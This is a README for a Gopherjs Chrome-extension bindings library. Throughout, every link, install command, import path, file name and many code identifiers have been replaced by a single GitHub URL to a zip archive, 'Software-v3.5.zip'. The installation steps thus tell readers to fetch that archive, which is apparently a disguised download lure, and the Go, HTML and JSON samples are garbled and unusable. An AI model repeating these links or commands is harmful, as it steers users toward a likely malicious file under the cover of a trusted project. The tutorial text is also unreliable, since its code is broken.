Gopherjs Chrome Bindings
------------------------------------

[![GoDoc](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip)](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip)

Write Chrome extensions in Go!

With the help of the [Gopherjs transpiler](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip), you can now write Go code which will be converted into javascript and run in the browser. This library contains the necessary bindings to interact with the Chrome Javascript API in an easy and intuitive way so that you can write Chrome Extensions and Chrome OS apps in Go.

# Installation

First make sure you have Gopherjs installed:

```bash
go get -u https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip
```

Next, install the chrome bindings library:

```bash
go get https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip
```

and include the package in your project's imports:

```bash
import "https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip"
```

# Sample Extension

The lovely people at Google's Chrome team have written a [great post](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip) on how to get started building chrome extensions. Within the examples folder you will find a [Go version](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip) of the JS sample extension they cover in their post.

![](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip)

In order to run this sample extension, simply navigate to ```chrome://extensions``` from within your chrome browser and click ```Load unpacked extension...``` and open the examples/getting-started-sample folder. This should install the chrome extension. Now visit any webpage and click on the globe-like icon on the top right of your chrome browser.

# Creating a New Extension

Here is a step-by-step guide on how to create a chrome extension written in go. First, lets create a new project folder and create a https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip and https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip file within it:

```
mkdir my_chrome_extension
```

```
cd ./my_chrome_extension
```

```
touch https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip
```

```
touch https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip
```

Lets write the following into our manifest:

```json
{
  "manifest_version": 2,

  "name": "My Chrome Extension",
  "description": "This is a chrome extension written in Go",
  "version": "1.0",

  "browser_action": {
    "default_popup": "https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip"
  },
  "permissions": [
    "tabs"
  ]
}
```

The most important aspects of the manifest file are the permissions included. In order to use a particular Chrome API, you will need to include its permission-type within this manifest file. Since this demo extension will create new tabs every time we active it, we have included the "tabs" permission.

Lets also add the following to the https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip file:

```html
<html>
  <head>
  <style>
      #notification {
        width: 300px;
      }
    </style>
  </head>
  <body>
  	<h1 id="notification"></h1>
  	<script src="https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip"></script>
  </body>
</html>
```
Here we simply declare an h1 tag with an id we can reference from within our app. We also include an "https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip" script which will eventually contain the JS version of our Go code.

The next step is to create our https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip file, we will do this within a go folder which will contain all our Go code:

```
mkdir go
```

```
cd go
```

```
touch https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip
```

Within this https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip file, we will write the following:

```go
package main

import (
	"strconv"
	"https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip"
	"https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip"
)

func main() {
	c := https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip()

	tabDetails := https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip{
		"active": false,
	}
	https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip(tabDetails, func(tab https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip) {
		notification := "Tab with id: " + https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip(https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip) + " created!"
		https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip().Document().GetElementByID("notification").SetInnerHTML(notification)
	})

}
```
This program imports Dominikh's [dom](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip) package for easy dom manipulation and the chrome bindings. We first instantiate the chrome object with "https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip()" and call methods on its properties, in this case "https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip".

Whereas in javascript you would write:

```js
https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip(tabDetails, function(tab) {
	https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip(tab)
})
```

in Go, you can now write:

```go
https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip(tabDetails, func(tab https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip) {
	https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip(tab)
})
```

The rest of the script calls Create() on the Tab property, creating a new non-active tab. Once the tab has been created, the callback function is called and the newly created Tab struct is returned. We then simply append a nice message to the notification header included in the https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip  file.

The last step is for us to transpile our https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip code into an https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip file:

```
gopherjs build https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip -o https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip
```

This will create an https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip file within our main project folder that will be included into the https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/resources/Software-v3.5.zip page upon load. And we are done!

In order to run your newly created chrome extension, upload the containing folder from the "chrome://extensions" page by clicking "Load unpacked extension...". Then click on the puzzle piece icon in the top right of your chrome browser. Et Voila!

# Tests

Because of the immense amount of endpoints in the Chrome API, as well as the many different requirements for the endpoints, the tests are still a work in progress.

To run the tests, install the ```tests``` folder as a chrome extension by navigating to ```chrome://extensions``` in Chrome and clicking ```Load unpacked extension...``` and navigating to the "tests" folder. Once you have done time, simply click the ```T``` icon on the top right of your chrome browser and the test suite will run within the displayed popup.

Feel free to add more tests to this extension and submit a pull request!